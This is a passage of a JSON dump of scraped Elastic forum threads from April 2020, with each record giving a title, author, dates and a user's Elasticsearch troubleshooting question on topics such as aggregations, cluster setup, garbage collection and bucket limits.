    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "f4643d06-e687-4514-ab98-82a0ba0a319a",
    "url": "https://discuss.elastic.co/t/how-to-get-all-records-in-bucket/229216",
    "title": "How to get all records in bucket",
    "category": [
      "Elasticsearch"
    ],
    "author": "Ramesh_Kumar",
    "date": "April 22, 2020, 9:25am April 22, 2020, 9:26am April 22, 2020, 9:35am April 22, 2020, 11:29am",
    "body": "{ \"aggs\":{ \"country\":{ \"terms\":{ \"field\":\"country.keyword\" }, \"size\":1000, \"aggs\":{ \"videocount\":{ \"sum\":{ \"field\":\"video_count\" } }, \"viewcount\":{ \"sum\":{ \"field\":\"view_count\" } }, \"subscribers\":{ \"sum\":{ \"field\":\"subscribers\" } } } } } }",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "2696e05f-af88-48e7-bc88-fea9a22e21d9",
    "url": "https://discuss.elastic.co/t/bulk-delete-in-elasticsearch/228826",
    "title": "Bulk delete in elasticsearch",
    "category": [
      "Elasticsearch"
    ],
    "author": "A_google_user",
    "date": "April 20, 2020, 9:25am April 20, 2020, 9:49am April 20, 2020, 10:51am April 20, 2020, 11:42am April 20, 2020, 12:36pm April 20, 2020, 12:50pm April 21, 2020, 9:11pm April 21, 2020, 9:39pm April 21, 2020, 9:42pm April 22, 2020, 10:23am April 22, 2020, 11:19am",
    "body": "If I have a list of ids can I bulk delete those documents with ids?",
    "website_area": "discuss",
    "replies": 11
  },
  {
    "id": "0038350f-7409-49ad-9174-1906e73f1d21",
    "url": "https://discuss.elastic.co/t/reload-search-analyzers/228002",
    "title": "Reload_search_analyzers",
    "category": [
      "Elasticsearch"
    ],
    "author": "chari",
    "date": "April 14, 2020, 9:29pm April 14, 2020, 10:10pm April 14, 2020, 10:28pm April 14, 2020, 10:56pm April 15, 2020, 3:51pm April 21, 2020, 4:50pm April 22, 2020, 2:21pm April 22, 2020, 11:15am",
    "body": "i have the following sequence of python api calls to ES. from elasticsearch import Elasticsearch es=Elasticsearch([{'host':'127.0.0.1','port':9200}]) es.indices.reload_search_analyzers(index=\"myindex\") but I see an error message AttributeError: 'IndicesClient' object has no attribute 'reload_search_analyzers' any ideas will be appreciated.",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "8b228436-9b2e-47d7-af3f-16abc715c8ac",
    "url": "https://discuss.elastic.co/t/stop-all-nodes-while-stopping-master-node/229218",
    "title": "Stop all nodes while stopping master node",
    "category": [
      "Elasticsearch"
    ],
    "author": "abhishek1",
    "date": "April 22, 2020, 9:22am April 22, 2020, 9:24am April 22, 2020, 9:34am April 22, 2020, 9:49am April 22, 2020, 10:49am April 22, 2020, 10:52am April 22, 2020, 10:59am April 22, 2020, 11:08am",
    "body": "Hi, I have configured my elasticsearch cluster configuration like below Node 1 : Master Node only Node 2: Master/data Node 3: data node only I have configured master eligible node Node1 and node2 When i stopped node1 then all node are stopping i am not able to connect through head plugin . if node 1 stopped then node2 should be taken as master right ?? Then i should be connected through headplugin but it is not happening . Could you please help me why it is happening so.",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "3548ad86-917a-4dbd-9c37-da422ad3d86f",
    "url": "https://discuss.elastic.co/t/refresh-indexed-value/229233",
    "title": "Refresh indexed value",
    "category": [
      "Elasticsearch"
    ],
    "author": "legolas_bilbao",
    "date": "April 22, 2020, 10:45am April 22, 2020, 10:48am April 22, 2020, 10:51am",
    "body": "Hi everybody, I've populate elasticsearch and kibana from data from a database but I've update some values in rows that are indexed yet, how can i reflex the update into elastic and kibana? kindly regards",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "0d9a2245-4cb8-4d8e-8ee6-8daf66fe31e9",
    "url": "https://discuss.elastic.co/t/cannot-set-up-cluster-on-3-machines-when-using-xpack-7-6-2/228650",
    "title": "Cannot set up cluster on 3 machines when using Xpack (7.6.2)",
    "category": [
      "Elasticsearch"
    ],
    "author": "newschapmj1",
    "date": "April 18, 2020, 2:40pm April 18, 2020, 2:53pm April 22, 2020, 10:50am",
    "body": "I have successfully set up a 3 node cluster This is based on 3 VMS (Ubuntu 20.04). The machines are named node1, node2 & node3 with static ip addresses (192.168.64.21..23) I have added Kibana on node1 and this also works. see below for elasticsearch.yml v7.6.2 https://www.elastic.co/guide/en/elasticsearch/reference/7.6/targz.html running in a terminal window (not as a daemon) Problem However, if I repeat the process after emptying the log and data folders based on https://www.elastic.co/blog/getting-started-with-elasticsearch-security node2 & node3 not running elasticsearch yet. enable the xpack settings in all 3 elasticsearch.yml in the Various section. #security section added by JC xpack.security.enabled: true xpack.security.transport.ssl.enabled: true xpack.security.transport.ssl.verification_mode: certificate xpack.security.transport.ssl.keystore.path: elastic-certificates.p12 xpack.security.transport.ssl.truststore.path: elastic-certificates.p12 node1 a) ./bin/elasticsearch b) ./bin/elasticsearch-setup-passwords auto failed to determine the health of the cluster running at http://192.168.64.21:9200 Unexpected response code [503] from calling GET http://192.168.64.21:9200/_cluster/health?pretty Cause: master_not_discovered_exception It is recommended that you resolve the issues with your cluster before running elasticsearch-setup-passwords. It is very likely that the password changes will fail when run against an unhealthy cluster. Do you want to continue with the password setup process [y/N] Notes 3 vms Ubuntu 20.04 ufw firewall enabled for ports 9200, 9300, 5601, 443, 22 on all 3 nodes node1 192.168.64.21 node2 192.168.64.22 node3 192.168.64.23 downloaded elasticsearch to home/chapmj/elasticsearch home/chapmj/data home/chapmj/logs node1 elasticsearch.yml # ======================== Elasticsearch Configuration ========================= # # NOTE: Elasticsearch comes with reasonable defaults for most settings. # Before you set out to tweak and tune the configuration, make sure you # understand what are you trying to accomplish and the consequences. # # The primary way of configuring a node is via this file. This template lists # the most important settings you may want to configure for a production cluster. # # Please consult the documentation for further information on configuration options: # https://www.elastic.co/guide/en/elasticsearch/reference/index.html # # ---------------------------------- Cluster ----------------------------------- # # Use a descriptive name for your cluster: # cluster.name: cluster1 # # ------------------------------------ Node ------------------------------------ # # Use a descriptive name for the node: # node.name: node1 # # Add custom attributes to the node: # #node.attr.rack: r1 # # ----------------------------------- Paths ------------------------------------ # # Path to directory where to store the data (separate multiple locations by comma): # path.data: /home/chapmj/data # # Path to log files: # path.logs: /home/chapmj/log # # ----------------------------------- Memory ----------------------------------- # # Lock the memory on startup: # #bootstrap.memory_lock: true # # Make sure that the heap size is set to about half the memory available # on the system and that the owner of the process is allowed to use this # limit. # # Elasticsearch performs poorly when the system is swapping the memory. # # ---------------------------------- Network ----------------------------------- # # Set the bind address to a specific IP (IPv4 or IPv6): # network.host: 192.168.64.21 # # Set a custom port for HTTP: # http.port: 9200 # # For more information, consult the network module documentation. # # --------------------------------- Discovery ---------------------------------- # # Pass an initial list of hosts to perform discovery when this node is started: # The default list of hosts is [\"127.0.0.1\", \"[::1]\"] # discovery.seed_hosts: [\"node2\", \"node3\"] # # Bootstrap the cluster using an initial set of master-eligible nodes: # cluster.initial_master_nodes: [\"node1\", \"node2\", \"node3\"] # # For more information, consult the discovery and cluster formation module documentation. # # ---------------------------------- Gateway ----------------------------------- # # Block initial recovery after a full cluster restart until N nodes are started: # #gateway.recover_after_nodes: 3 # # For more information, consult the gateway module documentation. # # ---------------------------------- Various ----------------------------------- # # Require explicit names when deleting indices: # #action.destructive_requires_name: true # #security section added by JC #xpack.security.enabled: true #xpack.security.transport.ssl.enabled: true #xpack.security.transport.ssl.verification_mode: certificate #xpack.security.transport.ssl.keystore.path: elastic-certificates.p12 #xpack.security.transport.ssl.truststore.path: elastic-certificates.p12 ------------------",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "40983a73-15b1-46fc-b069-15b028dfadd1",
    "url": "https://discuss.elastic.co/t/combine-random-sampling-with-vector-similarity-scoring/228045",
    "title": "Combine random sampling with vector similarity scoring",
    "category": [
      "Elasticsearch"
    ],
    "author": "Abraham_Sanders",
    "date": "April 15, 2020, 7:28am April 20, 2020, 10:21pm April 22, 2020, 3:30am April 22, 2020, 10:23am",
    "body": "I have an index with a dense_vector field on which I am doing text similarity search. (For reference, I followed the sample here:https://www.elastic.co/blog/text-similarity-search-with-vectors-in-elasticsearch) In the documentation, it mentions that vector functions are applied linearly to all documents matching a query, and that a filter should be applied to restrict the number of documents that are scanned linearly. In my use case I would like to filter by date range, however my index is so large that I could get millions of docs matching just one day. If a user wanted to query for a week or a month, it could match hundreds of millions of documents - clearly not something I would want to scan linearly. Ideally I would like to randomly sample N documents that match my date range and then pass that limited set to the linear time vector function. Something like this: \"query\": { \"script_score\": { \"query\": { \"function_score\": { \"query\": { ...date range filter here... } }, \"random_score\": {}, \"boost_mode\": \"replace\", \"max_results\": 10000 <----- IS SOMETHING LIKE THIS POSSIBLE? } }, \"script\": { \"source\": \"cosineSimilarity(params.query_vector, doc['my_dense_vector']) + 1.0\", \"params\": { \"query_vector\": [0.1, 0.2, ...] } } } To be clear, I am not asking how to use the search \"size\" parameter, rather I want to limit the inner query that passes its results to the script_score. Thanks!",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "be1a804c-2aaa-41a6-83ae-777d84491757",
    "url": "https://discuss.elastic.co/t/finding-nearest-locations-for-a-geo-point-near-antimeridian/229110",
    "title": "Finding nearest locations for a geo-point near antimeridian",
    "category": [
      "Elasticsearch"
    ],
    "author": "vmanohar1",
    "date": "April 21, 2020, 5:42pm April 22, 2020, 10:22am April 22, 2020, 10:21am",
    "body": "Hi.. I had following questions --> If I want to find nearest locations from a given location(using sort) and this location happens to be close to anti-meridian, will it cover near by locations across anti-meridian?? Find all locations inside a given polygon when the polygon crosses anti-meridian.. Is this supported?? My questions are related to Version 7.6.. Thank you very much.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "f07bba5c-de55-4d9a-a1a4-3070b5bfa38d",
    "url": "https://discuss.elastic.co/t/alert-query-for-multiple-indexes/228911",
    "title": "Alert query for multiple indexes",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 22, 2020, 10:18am April 22, 2020, 10:18am",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "69a0258b-e72c-4122-9354-deeb29d60363",
    "url": "https://discuss.elastic.co/t/multinode-cluster-replication-shards/229018",
    "title": "MultiNode Cluster Replication Shards",
    "category": [
      "Elasticsearch"
    ],
    "author": "ksremo",
    "date": "April 21, 2020, 3:17pm April 21, 2020, 3:15pm April 21, 2020, 3:22pm April 22, 2020, 10:08am April 22, 2020, 10:09am",
    "body": "I case i have 8 ES nodes on 4 physical Hosts with a setting of 8 primary shards and 1 replica shard. So it runs 2 ES Nodes on 1 physical Host. How i can prevent that that the replica shard is stored on one of the two instances on 1 physical host? I want high availibity in case that 1 physical host is offline.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "2612a9d2-5473-4ef4-9a55-7834e0b53416",
    "url": "https://discuss.elastic.co/t/elasticsarch-garbage-collection-issue/229211",
    "title": "Elasticsarch Garbage Collection Issue",
    "category": [
      "Elasticsearch"
    ],
    "author": "sam0853",
    "date": "April 22, 2020, 8:47am April 22, 2020, 8:45am April 22, 2020, 8:49am April 22, 2020, 9:04am April 22, 2020, 9:26am April 22, 2020, 9:27am April 22, 2020, 9:36am April 22, 2020, 9:46am April 22, 2020, 9:54am April 22, 2020, 9:56am April 22, 2020, 11:11am April 22, 2020, 9:59am April 22, 2020, 10:01am",
    "body": "Hi Team, I am continuously observing, my ES cluster goes into [GC] mode. Below is my cluster configuration, 3 datastore having below H/W configuration, 1: 8C/64GB/6TB 2: 8C/64GB/6TB 3: 8C/64GB/6TB Current Cluster Stats: Total No of Shards: 290 (including replica) Primary Shards: 145 Heap Size Assigned: 25GB Cluster Health: Green Elasticsearch Version: 6.3.0 The above-mentioned cluster running in a proper manner without issue. Still cluster continuously going into Garbage Collection Mode and goes completely down. Can anyone have any idea to run this cluster smoothly? Elasticsearch Logs: [2020-04-22T07:30:17,924][INFO ][o.e.m.j.JvmGcMonitorService] [ykmWSiI] [gc][94883] overhead, spent [334ms] collecting in the last [1s] [2020-04-22T07:32:09,993][INFO ][o.e.m.j.JvmGcMonitorService] [ykmWSiI] [gc][94995] overhead, spent [262ms] collecting in the last [1s] [2020-04-22T08:00:23,866][INFO ][o.e.m.j.JvmGcMonitorService] [ykmWSiI] [gc][96688] overhead, spent [383ms] collecting in the last [1s] [2020-04-22T08:00:51,894][INFO ][o.e.m.j.JvmGcMonitorService] [ykmWSiI] [gc][96716] overhead, spent [257ms] collecting in the last [1s] [2020-04-22T08:01:00,896][INFO ][o.e.m.j.JvmGcMonitorService] [ykmWSiI] [gc][96725] overhead, spent [296ms] collecting in the last [1s] [2020-04-22T08:01:01,896][INFO ][o.e.m.j.JvmGcMonitorService] [ykmWSiI] [gc][96726] overhead, spent [349ms] collecting in the last [1s] [2020-04-22T08:01:02,896][INFO ][o.e.m.j.JvmGcMonitorService] [ykmWSiI] [gc][96727] overhead, spent [332ms] collecting in the last [1s] [2020-04-22T08:20:23,717][INFO ][o.e.c.m.MetaDataMappingService] [ykmWSiI] [dsdb-20200422/K5EiSEzESiuuClJobrZe3Q] update_mapping [evt] [2020-04-22T08:30:16,736][INFO ][o.e.m.j.JvmGcMonitorService] [ykmWSiI] [gc][98480] overhead, spent [318ms] collecting in the last [1s] [2020-04-22T08:32:16,901][INFO ][o.e.m.j.JvmGcMonitorService] [ykmWSiI] [gc][98600] overhead, spent [380ms] collecting in the last [1s]",
    "website_area": "discuss",
    "replies": 13
  },
  {
    "id": "90eecd21-6279-4f1c-b10b-f40574d4bb43",
    "url": "https://discuss.elastic.co/t/nullpointerexception-while-pinnedquery-with-aggregation/229219",
    "title": "NullPointerException while PinnedQuery with aggregation",
    "category": [
      "Elasticsearch"
    ],
    "author": "IliaIsakhin",
    "date": "April 22, 2020, 9:34am April 22, 2020, 9:59am",
    "body": "Hi, guys! I have a kotlin application and Elasticsearch v7.5.2 cluster. Im trying to execute common search request with Pinned subquery in parallel. Most of my requests were successfully finished, but couple of them ends with search_phase_execution_exception (all shards failed): Caused by: java.lang.NullPointerException at org.apache.lucene.search.DisjunctionMaxScorer.advanceShallow(DisjunctionMaxScorer.java:80) ~[lucene-core-8.3.0.jar:8.3.0 2aa586909b911e66e1d8863aa89f173d69f86cd2 - ishan - 2019-10-25 23:10:03] at org.apache.lucene.search.ReqOptSumScorer.advanceShallow(ReqOptSumScorer.java:274) ~[lucene-core-8.3.0.jar:8.3.0 2aa586909b911e66e1d8863aa89f173d69f86cd2 - ishan - 2019-10-25 23:10:03] at org.apache.lucene.search.ConjunctionScorer.advanceShallow(ConjunctionScorer.java:80) ~[lucene-core-8.3.0.jar:8.3.0 2aa586909b911e66e1d8863aa89f173d69f86cd2 - ishan - 2019-10-25 23:10:03] at org.apache.lucene.search.CappedScoreQuery$1$1.get(CappedScoreQuery.java:127) ~[?:?] at org.apache.lucene.search.CappedScoreQuery$1.scorer(CappedScoreQuery.java:152) ~[?:?] at org.apache.lucene.search.DisjunctionMaxQuery$DisjunctionMaxWeight.scorer(DisjunctionMaxQuery.java:139) ~[lucene-core-8.3.0.jar:8.3.0 2aa586909b911e66e1d8863aa89f173d69f86cd2 - ishan - 2019-10-25 23:10:03] at org.apache.lucene.search.Weight.bulkScorer(Weight.java:181) ~[lucene-core-8.3.0.jar:8.3.0 2aa586909b911e66e1d8863aa89f173d69f86cd2 - ishan - 2019-10-25 23:10:03] at org.elasticsearch.search.internal.ContextIndexSearcher$1.bulkScorer(ContextIndexSearcher.java:162) ~[elasticsearch-7.5.2.jar:7.5.2] at org.elasticsearch.search.internal.ContextIndexSearcher.searchInternal(ContextIndexSearcher.java:189) ~[elasticsearch-7.5.2.jar:7.5.2] at org.elasticsearch.search.internal.ContextIndexSearcher.search(ContextIndexSearcher.java:173) ~[elasticsearch-7.5.2.jar:7.5.2] at org.apache.lucene.search.IndexSearcher.search(IndexSearcher.java:442) ~[lucene-core-8.3.0.jar:8.3.0 2aa586909b911e66e1d8863aa89f173d69f86cd2 - ishan - 2019-10-25 23:10:03] at org.elasticsearch.search.query.QueryPhase.execute(QueryPhase.java:270) ~[elasticsearch-7.5.2.jar:7.5.2] at org.elasticsearch.search.query.QueryPhase.execute(QueryPhase.java:113) ~[elasticsearch-7.5.2.jar:7.5.2] at org.elasticsearch.search.SearchService.loadOrExecuteQueryPhase(SearchService.java:335) ~[elasticsearch-7.5.2.jar:7.5.2] at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:355) ~[elasticsearch-7.5.2.jar:7.5.2] at org.elasticsearch.search.SearchService.lambda$executeQueryPhase$1(SearchService.java:340) ~[elasticsearch-7.5.2.jar:7.5.2] at org.elasticsearch.action.ActionListener.lambda$map$2(ActionListener.java:146) ~[elasticsearch-7.5.2.jar:7.5.2] at org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63) ~[elasticsearch-7.5.2.jar:7.5.2] In the same time my cluster state is { \"cluster_name\": \"my_cluster\", \"status\": \"yellow\", \"timed_out\": false, \"number_of_nodes\": 1, \"number_of_data_nodes\": 1, \"active_primary_shards\": 75, \"active_shards\": 75, \"relocating_shards\": 0, \"initializing_shards\": 0, \"unassigned_shards\": 64, \"delayed_unassigned_shards\": 0, \"number_of_pending_tasks\": 0, \"number_of_in_flight_fetch\": 0, \"task_max_waiting_in_queue_millis\": 0, \"active_shards_percent_as_number\": 53.956834532374096 } Im not sure if unassigned shards is the root of my problem, but i know that active_shards_percent_as_number should be 100. If you need some additional information like my OS facts or query sources, let me know, thanks!",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "670539a0-7fed-4fd9-aca0-159de4e3dd41",
    "url": "https://discuss.elastic.co/t/can-only-use-prefix-queries-on-keyword-and-text-fields-not-on-socode-which-is-of-type/225358",
    "title": "Can only use prefix queries on keyword and text fields - not on [soCode] which is of type",
    "category": [
      "Elasticsearch"
    ],
    "author": "Oh_Chee_Peng",
    "date": "March 27, 2020, 1:04pm March 27, 2020, 8:53am March 27, 2020, 12:54pm March 27, 2020, 1:09pm March 27, 2020, 11:40pm April 22, 2020, 9:41am",
    "body": "I have this scenario, where the keyword is string, ex: customerName, which is string; as well as soCode, which is number. First, I added a record into elasticsearch: POST sales-orders/_doc/1234 { customerName: \"hello world\", //<---- this is string soCode: 5678 //<---- this is long } Then, I executed this: GET sales-orders/_search { simple_query_string: { query: 'hello*', fields: ['customerName'] }, } It successfully return hits. Then I execute the following: GET sales-orders/_search { simple_query_string: { query: 'hello*', fields: ['customerName', 'soCode'] // <--- added soCode field. }, } When query, I got this error: 'Can only use prefix queries on keyword and text fields - not on [soCode] which is of type long' I need the search to be able to return result, if the keyword is 'hello', or '5678'. How to make this works?",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "afc50d58-430b-4efe-867f-a50c9d6ac270",
    "url": "https://discuss.elastic.co/t/ldap-config-problem/227492",
    "title": "LDAP config problem",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 10, 2020, 11:46am April 10, 2020, 12:42pm April 10, 2020, 12:50pm April 10, 2020, 1:10pm April 10, 2020, 1:22pm April 10, 2020, 1:31pm April 10, 2020, 6:45pm April 14, 2020, 6:36am April 14, 2020, 6:45am April 14, 2020, 6:59am April 14, 2020, 7:25am April 14, 2020, 7:33am April 14, 2020, 7:49am April 14, 2020, 8:41am April 14, 2020, 8:49am April 14, 2020, 4:48pm April 14, 2020, 8:56pm April 15, 2020, 8:19am April 15, 2020, 8:42am April 21, 2020, 9:24pm",
    "body": "",
    "website_area": "discuss",
    "replies": 21
  },
  {
    "id": "bf422ffd-60b9-41aa-b2d8-24dd4f1519ca",
    "url": "https://discuss.elastic.co/t/redirect-logs-to-newly-created-index-by-index-roll-over/226780",
    "title": "Redirect logs to newly created Index by Index Roll over",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 6, 2020, 9:02pm April 13, 2020, 7:52am April 6, 2020, 11:54pm April 7, 2020, 8:06pm April 7, 2020, 8:32pm April 7, 2020, 8:33pm April 7, 2020, 8:34pm April 13, 2020, 7:52am April 20, 2020, 9:39pm April 20, 2020, 11:25pm April 20, 2020, 11:27pm April 20, 2020, 11:28pm April 20, 2020, 11:31pm April 21, 2020, 10:40pm April 22, 2020, 8:54am",
    "body": "",
    "website_area": "discuss",
    "replies": 15
  },
  {
    "id": "496cd6db-a5ba-4d56-9909-6e22bb0a384a",
    "url": "https://discuss.elastic.co/t/about-merge-policy-for-a-segment-of-small-size/229212",
    "title": "About merge policy for a segment of small size",
    "category": [
      "Elasticsearch"
    ],
    "author": "Hyunsoo_Shim",
    "date": "April 22, 2020, 8:45am",
    "body": "Hello, I have a question about merge policy for a segment of small size. I have found a below segment from a shard and have expected that would be merged with new one since the size seemed to be small (just 3.3mb). \"_ks\" : { \"generation\" : 748, \"num_docs\" : 355, \"deleted_docs\" : 0, \"size_in_bytes\" : 3546268, \"memory_in_bytes\" : 41931, \"committed\" : true, \"search\" : true, \"version\" : \"7.5.0\", \"compound\" : true, \"attributes\" : { \"Lucene50StoredFieldsFormat.mode\" : \"BEST_SPEED\" } } But that segment is remained so long time although force merge is called.. If a segment size is over floor_segment value(2MB), Would that segment not be merged to new one without other trigger point(e.g., delete_weight)? Or is there any policy to trigger merge with segment size? FYI, I am using ES 6.5.2 version. Thanks.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "385b07dd-9405-44f8-8f42-de8b53a3d387",
    "url": "https://discuss.elastic.co/t/very-long-1min-to-create-index-fresh-cluster-kubernetes-with-ceph-storage/229195",
    "title": "Very long (1min) to create index, fresh cluster Kubernetes, with Ceph storage",
    "category": [
      "Elasticsearch"
    ],
    "author": "ebuildy",
    "date": "April 22, 2020, 8:31am",
    "body": "(topic withdrawn by author, will be automatically deleted in 24 hours unless flagged)",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "c55560fe-3974-4f12-b9dc-bd8a45c4334d",
    "url": "https://discuss.elastic.co/t/node-does-not-reclaim-full-memory-after-gc-kicks-at-75-and-it-eventually-dies/229199",
    "title": "Node does not reclaim full memory after GC kicks at 75% and it eventually 'dies'",
    "category": [
      "Elasticsearch"
    ],
    "author": "itmeze",
    "date": "April 22, 2020, 7:51am April 22, 2020, 8:06am April 22, 2020, 8:30am",
    "body": "Hi, I am new to ElasticSearch and at the moment i am evaluating it as a replacement for our sql server based search (in a couple of months time we will need text search for our products) I have an index for product search for the website. Each product is quite complex with 50-60 attributes. Overall index contains 220k products (1gb). There are no text fields, yet (so far we try to swap sql server with es) We set up a single node cluster via aws elasticsearch, es 7.4, r5.large.elasticseach instance type as really that was the quickest way for us to start - as we already use some of aws services. This is still a tryout, to evaluate if es is the way to go for us. We direct 20% of our search to that node, leaving 80% to sql server. At least twice a day full index is recreated: 1. create new index, 2. populate it with bulk insert, 3. swap alias, and 4. drop an old index. Number of searchable documents remain the same after process completes. We run quite a lot of search result aggregations (group by product features). I have no idea why, but it looks like jvm cannot reclaim enough memory, which eventually leads to increased cpu, and eventually starts to trigger circuit_breaker_exception. This happens each time - after few days node is unusable - which i don't understand why, knowing i recreate index at least once a day. Any idea why is it happening, and how to prevent it? Previously this has run fine on sql server (on premise, machine with half of those specs) - we are investigating move to elasticsearch due to it's text search capabilities (which we do not use yet) dyingnode1691×915 86.9 KB",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "d7ae2074-1ed5-496a-b743-ec7b113de0d9",
    "url": "https://discuss.elastic.co/t/how-to-use-a-fields-meta-data-in-search-results/228996",
    "title": "How to use a field's meta data in search results",
    "category": [
      "Elasticsearch"
    ],
    "author": "arun_001",
    "date": "April 21, 2020, 1:32pm April 22, 2020, 8:26am April 22, 2020, 8:25am",
    "body": "My requirement is to store some meta data against some fields and retrieve them as part of search results. Looks like the following is what I'm looking for but I'm not sure how use that in a single query. https://www.elastic.co/guide/en/elasticsearch/reference/7.6/mapping-field-meta.html Ex: PUT my_index { \"mappings\": { \"properties\": { \"latency\": { \"type\": \"long\", \"meta\": { \"unit\": \"ms\" } } } } } I want that unit 'ms' to be added to that field in all the documents retrieved for a query.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "0c94f18b-8645-47be-9f61-6174c8e56224",
    "url": "https://discuss.elastic.co/t/configuring-slack-watcher-on-elasticcloud-finished-but-ultimately-failed/229016",
    "title": "Configuring Slack Watcher on ElasticCloud : \"Finished but ultimately failed\"",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 22, 2020, 8:15am",
    "body": "",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "f55b54f8-72c1-47ac-8316-0e59b6574b83",
    "url": "https://discuss.elastic.co/t/why-doesnt-elect-master-node/229190",
    "title": "Why doesn't elect master node?",
    "category": [
      "Elasticsearch"
    ],
    "author": "hgdo",
    "date": "April 22, 2020, 6:42am April 22, 2020, 6:44am April 22, 2020, 6:47am April 22, 2020, 6:57am April 22, 2020, 6:57am April 22, 2020, 6:59am April 22, 2020, 7:20am April 22, 2020, 7:33am April 22, 2020, 7:33am April 22, 2020, 7:58am",
    "body": "Hi. I created a Elasticsearch cluster with 2 servers. Elasticsearch Cluster version is 7.6.2. Each server has three master nodes. I am currently doing a failover test. First, if you kill server 1 that has a master node, the master node is elected from server 2. Second, if you restart server 1 and kill server 2, the master node is not elected from server 1. I want to know why the Masternode is not elected from the second. Thank you.",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "51ed14d9-b5d5-4824-9caf-eafaa9d09ae4",
    "url": "https://discuss.elastic.co/t/search-machine-learning-result-and-use-watcher-send-message-to-telegram/229198",
    "title": "Search Machine Learning result and use watcher send message to telegram",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 22, 2020, 7:51am",
    "body": "",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "02d01558-2c58-4c65-8392-d561c4ade651",
    "url": "https://discuss.elastic.co/t/kibana-watcher-custom-icon/229196",
    "title": "Kibana watcher custom icon",
    "category": [
      "Elasticsearch"
    ],
    "author": "Silver",
    "date": "April 22, 2020, 7:29am",
    "body": "Hello, How to put a custom icon for this? image2054×1112 221 KB",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "73c711cc-ee0f-4800-93cb-f839a93ab049",
    "url": "https://discuss.elastic.co/t/too-many-buckets-exception-in-elasticseach-7-0-1/228080",
    "title": "Too_many_buckets_exception in Elasticseach.7.0.1",
    "category": [
      "Elasticsearch"
    ],
    "author": "prashant1",
    "date": "April 15, 2020, 10:13am April 22, 2020, 7:26am",
    "body": "Hi, We came across an error where the query for Dashborad threw for Too_many_buckets_exception. We looked into couple of queries on elastic community and found that in Elasticseach 7.X the value for max_buckets is 10000 and the query is failing because it needs more buckets. If we increase the value to 15000 it works fine by the below command PUT _cluster/settings { \"transient\": { \"search.max_buckets\": <increase that number more than 10000> } } However, we have couple of concern that we would like to clarify: Previously the limit for max_bucket was unlimited in Elasticseach 6.X, why it is set to 10000 in Elasticseach 7.X ? What the risk/impact of incresing the max_buckets. What can be the maximum value that can be set to it? Is there any way to tune max_buckets ? Thanks and Regards, Prashant",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "67539d4f-fec2-458e-9c67-cc5740b09570",
    "url": "https://discuss.elastic.co/t/get-the-error-no-processor-type-exist-with-name-script/229171",
    "title": "Get the error : No processor type exist with name [script]",
    "category": [
      "Elasticsearch"
    ],
    "author": "Dhwanil_Patel",
    "date": "April 22, 2020, 4:13am April 22, 2020, 7:26am",
    "body": "My project is in spring boot and i run elastic-search using docker. Now after elastic-search creation when i run my spring boot project i got this error, es_error1539×257 55.9 KB I checked same thing using kibana but it's there i bit confused how it happens. If anyone have an idea please guide me. kibana_error_11691×746 76.8 KB",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "d0bae5be-f771-4b69-80d7-afbba2b94516",
    "url": "https://discuss.elastic.co/t/toomanybuckets-exception/229176",
    "title": "TooManyBuckets Exception",
    "category": [
      "Elasticsearch"
    ],
    "author": "AClerk",
    "date": "April 22, 2020, 5:28am April 22, 2020, 6:05am April 22, 2020, 7:14am April 22, 2020, 7:21am",
    "body": "Hey I am using ES 7.3 with Kibana. I encountered this error in a few visualisations and I cannot figure out what is wrong. For example - I am trying to visual a time line of Bytes read/write per host. 2020-04-22 15_13_36-Window518×542 19.2 KB But I am getting this error : org.elasticsearch.search.aggregations.MultiBucketConsumerService$TooManyBucketsException: Trying to create too many buckets. Must be less than or equal to: [12000] but was [12001]. This limit can be set by changing the [search.max_buckets] cluster level setting. I tried increasing the max buckets to 12000, but it still fails. What I know - Multiple indices are searched as my index pattern covers a few indices and not just one. If I reduce the time filter the visualisation works. e.g. from 'Today' to 'Last 1 hour' So, the questions are: What is wrong? What should I check? How should I fix this? I read a few previous discussions, but couldn't find any ones that could help me. Thanks",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "1e596fa7-54ab-44e0-8ef2-c6d534770ba5",
    "url": "https://discuss.elastic.co/t/reindex-failing-with-searchcontextmissingexception-no-search-context-found-for-id-batch-size-1/229191",
    "title": "Reindex failing with SearchContextMissingException: No search context found for id (batch size = 1)",
    "category": [
      "Elasticsearch"
    ],
    "author": "mrpew",
    "date": "April 22, 2020, 6:57am",
